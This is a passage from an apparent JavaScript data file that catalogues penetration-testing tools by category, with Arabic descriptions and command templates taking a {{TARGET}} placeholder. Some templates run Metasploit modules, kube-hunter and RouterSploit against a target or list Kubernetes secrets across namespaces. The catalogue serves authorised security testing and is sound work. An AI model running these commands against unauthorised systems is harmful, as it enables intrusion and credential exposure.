        "commands": [
          "adb shell pm list packages | grep {{TARGET}} | tee adb-packages-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Frida",
        "description": "Dynamic Instrumentation",
        "commands": [
          "frida -U -f com.{{TARGET}}.app -l script.js | tee frida-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "container-security",
    "title": "Container & Cloud Security",
    "titleAr": "أمان الحاويات والسحابة",
    "tools": [
      {
        "name": "Docker - Image Scan",
        "description": "فحص صور Docker",
        "commands": [
          "docker scan {{TARGET}}/image:latest | tee docker-scan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Trivy - Container",
        "description": "فحص ثغرات الحاويات",
        "commands": [
          "trivy image {{TARGET}}/app:latest | tee trivy-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Anchore",
        "description": "تحليل صور Docker",
        "commands": [
          "anchore-cli image add {{TARGET}}/image:latest && anchore-cli image vuln {{TARGET}}/image:latest all | tee anchore-{{TARGET}}.txt"
        ]
      },
      {
        "name": "kube-bench",
        "description": "فحص Kubernetes CIS",
        "commands": [
          "kube-bench run --targets master,node | tee kube-bench-{{TARGET}}.txt"
        ]
      },
      {
        "name": "kube-hunter",
        "description": "البحث عن ثغرات K8s",
        "commands": [
          "kube-hunter --remote {{TARGET}} | tee kube-hunter-{{TARGET}}.txt"
        ]
      },
      {
        "name": "kubectl - Pods",
        "description": "قائمة Pods",
        "commands": [
          "kubectl get pods --all-namespaces | tee kubectl-pods-{{TARGET}}.txt"
        ]
      },
      {
        "name": "kubectl - Secrets",
        "description": "عرض Secrets",
        "commands": [
          "kubectl get secrets --all-namespaces | tee kubectl-secrets-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Popeye",
        "description": "Kubernetes Sanitizer",
        "commands": [
          "popeye | tee popeye-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "exploit-dev",
    "title": "Exploit Development",
    "titleAr": "تطوير الثغرات",
    "tools": [
      {
        "name": "Metasploit - Search",
        "description": "البحث عن Exploits",
        "commands": [
          "msfconsole -q -x \"search {{TARGET}}; exit\" | tee msf-search-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SearchSploit",
        "description": "بحث في Exploit-DB",
        "commands": [
          "searchsploit {{TARGET}} | tee searchsploit-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ROPgadget",
        "description": "ROP Gadgets",
        "commands": [
          "ROPgadget --binary binary-file | tee ropgadget-{{TARGET}}.txt"
        ]
      },
      {
        "name": "pwntools",
        "description": "Exploit Development",
        "commands": [
          "python3 exploit.py {{TARGET}} | tee pwntools-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Metasploit - AutoPwn",
        "description": "استغلال تلقائي",
        "commands": [
          "msfconsole -q -x \"use auxiliary/scanner/http/http_version; set RHOSTS {{TARGET}}; run; exit\" | tee msf-auto-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "reverse-engineering",
    "title": "Reverse Engineering",
    "titleAr": "الهندسة العكسية",
    "tools": [
      {
        "name": "Ghidra",
        "description": "تفكيك وتحليل",
        "commands": [
          "analyzeHeadless /path/to/project ProjectName -import binary -postScript script.py | tee ghidra-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Radare2",
        "description": "إطار هندسة عكسية",
        "commands": [
          "r2 -A binary && r2 -q -c 'aaa; pdf @ main' binary | tee radare2-{{TARGET}}.txt"
        ]
      },
      {
        "name": "IDA Free - Strings",
        "description": "استخراج Strings",
        "commands": [
          "strings binary | grep {{TARGET}} | tee strings-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ObjDump",
        "description": "Disassemble",
        "commands": [
          "objdump -d binary | tee objdump-{{TARGET}}.txt"
        ]
      },
      {
        "name": "strace",
        "description": "تتبع System Calls",
        "commands": [
          "strace -f -e trace=network ./binary | tee strace-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ltrace",
        "description": "تتبع Library Calls",
        "commands": [
          "ltrace ./binary | tee ltrace-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "forensics",
    "title": "Digital Forensics",
    "titleAr": "الطب الشرعي الرقمي",
    "tools": [
      {
        "name": "Volatility - Process List",
        "description": "تحليل Memory Dump",
        "commands": [
          "volatility -f memory.dmp --profile=Win7SP1x64 pslist | tee volatility-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Autopsy",
        "description": "تحليل القرص",
        "commands": [
          "autopsy | tee autopsy-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Foremost",
        "description": "استرجاع الملفات",
        "commands": [
          "foremost -i disk.img -o foremost-output-{{TARGET}}"
        ]
      },
      {
        "name": "Bulk Extractor",
        "description": "استخراج المعلومات",
        "commands": [
          "bulk_extractor -o bulk-output-{{TARGET}} disk.img"
        ]
      },
      {
        "name": "Binwalk",
        "description": "تحليل Firmware",
        "commands": [
          "binwalk -e firmware.bin -C binwalk-{{TARGET}}"
        ]
      },
      {
        "name": "ExifTool",
        "description": "بيانات وصفية للصور",
        "commands": [
          "exiftool image.jpg | tee exiftool-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "iot-embedded",
    "title": "IoT & Embedded Security",
    "titleAr": "أمان إنترنت الأشياء",
    "tools": [
      {
        "name": "Firmwalker",
        "description": "تحليل Firmware",
        "commands": [
          "./firmwalker.sh firmware/ firmwalker-{{TARGET}}.txt"
        ]
      },
      {
        "name": "EMBA",
        "description": "Embedded Analyzer",
        "commands": [
          "./emba.sh -f firmware.bin -l emba-{{TARGET}}.log"
        ]
      },
      {
        "name": "Binwalk - Extract",
        "description": "استخراج Firmware",
        "commands": [
          "binwalk -e firmware.bin -C binwalk-extract-{{TARGET}}"
        ]
      },
      {
        "name": "UART Sniffer",
        "description": "تحليل UART",
        "commands": [
          "screen /dev/ttyUSB0 115200 | tee uart-{{TARGET}}.txt"
        ]
      },
      {
        "name": "RouterSploit",
        "description": "استغلال أجهزة التوجيه",
        "commands": [
          "rsf | tee routersploit-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Firmadyne",
        "description": "محاكاة Firmware",
        "commands": [
          "./run.sh firmware.bin | tee firmadyne-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "reporting",
    "title": "Reporting & Documentation",
    "titleAr": "التقارير والتوثيق",
    "tools": [
      {
        "name": "Dradis",
        "description": "منصة تقارير",
        "commands": [
          "dradis-server start | tee dradis-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Faraday",
        "description": "IDE للاختبار الأمني",
        "commands": [
          "faraday-server | tee faraday-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CherryTree",
        "description": "ملاحظات هرمية",
        "commands": [
          "cherrytree notes-{{TARGET}}.ctb"
        ]
      },
      {
        "name": "KeepNote",
        "description": "تدوين الملاحظات",
        "commands": [
          "keepnote notes-{{TARGET}}/"
        ]
      },
      {
        "name": "Joplin",
        "description": "تطبيق ملاحظات",
        "commands": [
          "joplin | tee joplin-{{TARGET}}.txt"
        ]
      }
    ]
  }
];
